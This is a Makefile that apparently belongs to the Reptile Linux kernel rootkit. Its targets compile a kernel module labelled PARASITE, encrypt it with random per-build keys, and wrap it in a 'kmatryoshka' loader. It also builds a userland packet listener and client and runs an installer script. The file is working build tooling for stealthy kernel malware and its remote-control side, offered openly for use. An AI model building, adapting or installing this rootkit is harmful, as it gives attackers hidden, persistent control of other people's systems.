CC := gcc
RM = rm -rf
SHELL := /bin/bash
PWD := $(shell pwd)
KERNEL := /lib/modules/$(shell uname -r)/build
CLIENT_DIR ?= $(PWD)/userland
CONFIG_SCRIPT ?= $(PWD)/scripts/kconfig/config.sh
CONFIG_FILE ?= $(PWD)/.config
GEN_RANDOM ?= $(PWD)/scripts/random.sh
BUILD_DIR ?= $(PWD)/output
BUILD_DIR_MAKEFILE ?= $(BUILD_DIR)/Makefile
MODULE_DIR ?= $(PWD)/kernel
ENCRYPT_SRC ?= $(PWD)/kernel/encrypt/encrypt.c
ENCRYPT ?= $(BUILD_DIR)/encrypt
KMATRYOSHKA_DIR ?= $(PWD)/kernel/kmatryoshka
PARASITE ?= $(BUILD_DIR)/reptile_module.ko
RAND1 = 0x$(shell cat /dev/urandom | head -c 4 | hexdump '-e"%x"')
RAND2 = 0x$(shell cat /dev/urandom | head -c 4 | hexdump '-e"%x"')
INCLUDE ?= -I$(PWD)/kernel/include
LOADER ?= $(PWD)/kernel/loader/loader.c
INSTALLER ?= $(PWD)/scripts/installer.sh

all: $(BUILD_DIR_MAKEFILE) userland_bin $(ENCRYPT) module kmatryoshka reptile

reptile: $(LOADER)
	@ $(ENCRYPT) $(BUILD_DIR)/reptile.ko $(RAND2) > $(BUILD_DIR)/reptile.ko.inc
	@ echo "  CC      $(BUILD_DIR)/$@"
	@ $(CC) $(INCLUDE) -I$(BUILD_DIR) $< -o $(BUILD_DIR)/$@

kmatryoshka:
	@ $(ENCRYPT) $(PARASITE) $(RAND1) > $(BUILD_DIR)/parasite_blob.inc
	@ $(MAKE) -C $(KERNEL) M=$(BUILD_DIR) src=$(KMATRYOSHKA_DIR)

module:
	@ $(MAKE) -C $(KERNEL) M=$(BUILD_DIR) src=$(MODULE_DIR)

$(ENCRYPT): $(ENCRYPT_SRC)
	@ echo "  CC      $(ENCRYPT)"
	@ $(CC) $(INCLUDE) -std=c99 $< -o $@

$(BUILD_DIR):
	@ mkdir -p $(BUILD_DIR)

$(BUILD_DIR_MAKEFILE): $(BUILD_DIR)
	@ touch $@

config:
	@ $(SHELL) $(CONFIG_SCRIPT) $@
	@ $(SHELL) $(GEN_RANDOM) $(CONFIG_FILE)

%config:
	@ $(SHELL) $(CONFIG_SCRIPT) $@
	@ $(SHELL) $(GEN_RANDOM) $(CONFIG_FILE)

userland_bin:
	@ $(MAKE) -C $(CLIENT_DIR) EXTRA_FLAGS=-D_REPTILE_

install:
	@ $(SHELL) $(INSTALLER)

client: $(BUILD_DIR)
	@ $(MAKE) -C $(CLIENT_DIR) packet listener client

.PHONY : clean module config

clean:
	@ $(RM) $(BUILD_DIR) $(CONFIG_FILE)